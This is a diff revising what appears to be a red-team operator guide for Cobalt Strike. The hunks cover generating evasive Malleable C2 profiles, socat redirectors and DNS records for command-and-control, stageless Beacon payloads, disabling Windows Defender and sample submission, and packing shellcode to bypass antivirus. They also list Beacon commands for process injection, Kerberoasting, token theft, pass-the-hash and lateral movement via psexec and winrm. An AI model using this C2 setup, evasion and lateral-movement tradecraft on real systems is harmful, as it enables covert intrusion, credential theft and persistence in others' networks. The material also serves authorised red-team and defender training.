@@ -2,7 +2,7 @@ Cobalt Strike
 
 
 Use the following install location: /opt/cobaltstrike/
-    This will allow you to get third-party apps installed when running /opt/discover/update.sh
+    This will allow you to get third-party repos installed when running /opt/discover/update.sh
 
 - Update
 cd /opt/cobaltstrike/
@@ -42,6 +42,8 @@ mv arsenal-kit /opt/cobaltstrike/
 
 # Create a random C2 profile
 
+OPSEC: Always use a Malleable C2 profile.
+
 - Option 1
 cd /opt/cobaltstrike/third-party/tylous-sourcepoint/
 go build SourcePoint.go
@@ -55,7 +57,7 @@ C2concealer --variant 3 --hostname target.com
 Answer the questions.
 This will create a random.profile.
 
-Run c2lint against your new profile to check for any possible OPSEC issues.
+Run c2lint against your new profile to check for possible OPSEC issues.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # OPSEC: If you manually create a new C2 profile, change the following options:
@@ -114,7 +116,7 @@ stage {
     set name             "changeme.dll";
 }
 
-Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for more default settings.
+Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for additional default settings.
 
 See also:
 https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
@@ -123,15 +125,13 @@ https://blog.zsec.uk/cobalt-strike-profiles/
 
 # Start the team server
 
-Start a screen session: screen -S lee
+Start a new screen session: screen -S <name>
 
 Parameters in <> are mandatory, those in [] are optional
 ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
 ./teamserver 192.168.1.5 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
 
 When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
-
-OPSEC: Always use a Malleable C2 profile.
 
 - Remove old data and Beacons (optional)
 Stop the team server.
@@ -170,11 +170,11 @@ Redirector 3 - DNS (long haul)
 Forwards all traffic on these ports. This is not OPSEC friendly.
 sudo -i
 apt-get install -y socat
-screen -S lee
+screen -S <name>                                            Start a new screen session
 socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1/2
 socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53     Redirector 3
 
-- Create SSL certificates for https redirectors
+- Create SSL certificates for the https redirectors
 Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
 keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
 
@@ -209,19 +209,20 @@ Payload: Beacon HTTPS
 HTTPS Hosts: click + <redirector2 IP>
 Save > OK
 
-Using your domain registar, add the following records for your DNS C2:
-@      A    <domain IP>
-ns1    A    <domain IP>
-data   NS   <domain>.com.
-
 Add
 Name: dns
 Payload: Beacon DNS
 DNS Hosts: click + <redirector3 IP>
 Save > OK
 
-OPSEC: Blend in with the named pipes of your target environment.
-Find an example using a similar Windows VM: ls \\.\pipe\
+Using your domain registar, add the following records for each redirector:
+https            A    <redirector IP>
+dns       @      A    <redirector IP>
+dns       ns1    A    <redirector IP>
+dns       data   NS   <domain>.com.
+
+OPSEC: Blend in with the named pipes from your target environment.
+Find examples using a similar Windows VM: ls \\.\pipe\
 
 Add
 Name: smb
@@ -231,20 +232,20 @@ Save
 
 Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
 This is needed when the target you compromised cannot directly reach your team server over HTTP/S.
-In graph mode, TCP Beacon are shown in green and SMB Beacons are shown in yellow.
+In graph mode, SMB Beacons are shown in yellow and TCP Beacon are shown in green.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Payloads
+# Generate a payload
 
 OPSEC: Staged payloads tend to have more indicators compared to stageless.
-Always prefer a fully staged or stageless payload and disable payload staging.
-(S) in Cobalt Strike refers to a stageless payload.
+Always prefer a fully staged/stageless (S) payload.
+Disable payload staging in your Malleable C2 profile.
 
-- Disable Windows Defender on your target Windows VM (home testing)
+- When testing at home, disable Windows Defender on your target Windows VM
 Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
 Standard: Windows Defender settings > turn off Real-time protection
+Make sure automatic sample submission is turned off.
 
-- Attack 1
 Attacks > Scripted Web Delivery (S)
 URI Path: /a
 Listener: select the https listener > Choose
@@ -255,17 +256,20 @@ Launch > OK
 Transfer the payload to your target and execute.
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 
-- Attack 2
-Payloads > Windows Stageless Payload
-Listener: select the https listener > Choose
-Output: Raw
-x64: Use x64 payload
-Generate > Save > OK
-Feed this shellcode into a tool like Scarecrow or another loader.
-
 - Troubleshooting
 View > Web Log
 This is helpful to know when HTTP/S requests are accessing your team server.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Bypass AV
+
+Enable Windows Defender on your taget VM.
+Payloads > Windows Stageless Payload
+Listener: select a listener > Choose
+Output: Raw
+x64: Use x64 payload
+Generate > Save > OK
+Feed this raw shellcode into Freeze, msfvenom, or NinSyscallPacker ($) to bypass AV.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Interact with a Beacon
@@ -338,7 +342,7 @@ net computers                                     Show doamin computers (this ca
 View > Targets                                    Discovered targets will populate
 
 ps                                                Show process list. Look for another user that is logged in
-inject <PID> <x86|x64> <listener>
+inject <PID> <x86|x64> <listener>                 Bad OPSEC, need to use a BOF
 
 screenshot <PID> x64                              Take a single screenshot (look for svchost running on the current user)
                                                   View > Screenshots
@@ -420,10 +424,10 @@ execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe kerberoast
 
 - Double-hop problem
 steal_token <PID>
-inject <PID> <x86|x64> <listener>
+inject <PID> <x86|x64> <listener>                 Bad OPSEC, need to use a BOF
 make_token <domain\user> <password>               Plaintext cred preference
 pth <domain\user> <hash>
-spawnas <domain\user> <password> <listener>
+spawnas <domain\user> <password> <listener>       Bad OPSEC, need to use a BOF
 Using Rubeus to request/apply a new ticket
 kerberos_ticket_use (with an existing ticket)
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -444,7 +448,7 @@ Copy the hash and crack with john.
 make_token domain\user <password>
 dir \\<FQDN>\C$\                                  BOF - Check to see if you have access (include the trailing backslash)
 
-jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <smb listener>
+jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <smb listener>   Bad OPSEC, need to use a BOF
 
 pth domain\user <hash>
 dir \\<FQDN>\C$\                                  BOF - Check to see if you have access (include the trailing backslash)
